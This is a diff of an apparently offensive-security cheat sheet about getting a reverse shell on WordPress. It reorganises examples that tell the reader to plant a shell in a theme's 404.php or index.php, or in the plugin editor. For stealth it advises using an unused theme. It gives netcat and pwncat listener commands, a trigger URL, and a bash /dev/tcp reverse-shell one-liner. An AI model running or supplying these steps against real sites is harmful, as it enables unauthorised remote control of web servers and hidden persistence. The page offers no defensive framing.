@@ -361,22 +361,35 @@ example 2.
 
 <h2>Get Reverse-Shell in Wordpress</h2>
 
-The best thing is to edit the 404.php file for the theme in use, as it dont hang the hole wordpress site, if you need to check the site for more information.
-
 
 First you need so set up your listner:
 
 <b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
 
-Then just surf to the victim´s wordpress site and try a site that dont exist and it gives you a 404 eror.
-
-
-
-Wordpress example 1.
+Wordpress example 1. - Using 404.php
 
 +-------------------+
 
-Edit index.php on a theme thats not in used.
+The best thing is to edit the 404.php file for the theme in use or another theme thats not in use, to be more stealth, 
+
+as it dont hang the hole wordpress site, if you need to check the site for more information.
+
+<b>First you need so set up your listner:</b>
+
+<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
+
+Then to load the reverse-shell just visit: http://10.10.20.20/wordpress/wp-content/themes/twentytwenty/404.php
+
+
+Wordpress example 2. - Using index.php
+
++-------------------+
+
+First you need so set up your listner:
+
+<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
+
+Edit the theme´s index.php file.
 
 Between :
 
@@ -386,7 +399,7 @@ get_header(); ?>
 
 <div class="wrap">
   
-Wordpress example 2.
+Wordpress example 3. - Using Plugin Editor
  
 +-------------------+
 
@@ -394,7 +407,7 @@ After logging in to the admin panel open the Plugin editor, in the bottom of a p
 
 Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
 
- Wordpress example 3.
+ Wordpress example 4. - Using header.php
  
 +-------------------+
 
